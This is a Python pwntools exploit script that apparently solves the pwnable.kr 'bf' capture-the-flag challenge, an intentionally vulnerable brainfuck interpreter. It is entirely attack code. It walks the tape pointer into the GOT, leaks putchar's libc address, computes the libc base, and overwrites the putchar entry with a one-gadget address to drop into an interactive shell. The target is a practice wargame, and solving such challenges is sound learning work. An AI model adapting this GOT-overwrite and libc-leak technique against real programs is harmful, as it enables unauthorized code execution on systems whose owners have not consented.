import struct
from pwn import *

BF_LIBC_PATH = "bf_libc.so"

GOT_ADDRESSES = {"getchar": 0x804a00c, "fgets": 0x804a010, "memset": 0x804a02c,
                 "putchar": 0x0804a030}

P_ADDRESS = 0x0804a0a0

START_ADDRESS = 0x80484e0

# The address that the got getchar entry points to.
GETCHAR_ADDRESS = 0x8048446


def move_addresses(address1: int, address2: int, direction: str) -> bytes:
    return (direction * (address2 - address1)).encode()


def main():
    """
    Find the offsets of putchar and system.
    """
    log.info("Setup")

    libc = ELF(BF_LIBC_PATH)

    system_offset = libc.symbols["system"]
    log.info(f"System libc offset : {hex(system_offset)}")
    putchar_offset = libc.symbols["putchar"]
    log.info(f"Putchar libc offset : {hex(putchar_offset)}")

    system_gadget_offset = 0x5fbd5

    """
    Sets ups the connections and payload.
    """

    shell = remote("pwnable.kr", 9001)

    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")

    log.info(f"Response: {response}")

    payload = b""

    """
    Leaks the address of libc by calling putchar and printing the current address of putchar
    after it was loaded to got.
    """
    payload += move_addresses(GOT_ADDRESSES["putchar"], P_ADDRESS, "<")
    payload += b"..>.>.>."

    """
    Returns the pointer to the address of putchar and changes the address using
    the getchar. 
    """
    payload += b"<<<"
    payload += b",>,>,>,"

    # move
    payload += move_addresses(GOT_ADDRESSES["putchar"], P_ADDRESS, ">")

    # Triggers the payload
    payload += b"."

    print(payload)
    shell.sendline(payload)

    """
    Recives the leaked address and 
    """

    leaked_libc_address = b""

    shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)

    leaked_libc_address = struct.unpack("I", leaked_libc_address)[0]

    """
    Uses the leaked address of the libc to find the base address of libc and the address of system.
    """
    log.info(f"Leaked libc : {hex(leaked_libc_address)}")

    base_libc_address = leaked_libc_address - putchar_offset
    log.info(f"Base libc address {hex(base_libc_address)}")

    system_libc_address = base_libc_address + system_offset
    log.info(f"System libc address {hex(system_libc_address)}")

    system_gadget_libc_address = base_libc_address + system_gadget_offset
    log.info(f"System gadget libc address {hex(system_gadget_libc_address)}")

    putchar_libc_address = base_libc_address + putchar_offset
    log.info(f"putchar libc address {hex(putchar_libc_address)}")

    """
    Sends the packed address of the system gadget to the program.
    """
    packed_gadget_address = int.to_bytes(system_gadget_libc_address, 4, "big")[::-1]
    print(packed_gadget_address)
    shell.sendline(packed_gadget_address)

    shell.interactive()


if __name__ == "__main__":
    main()
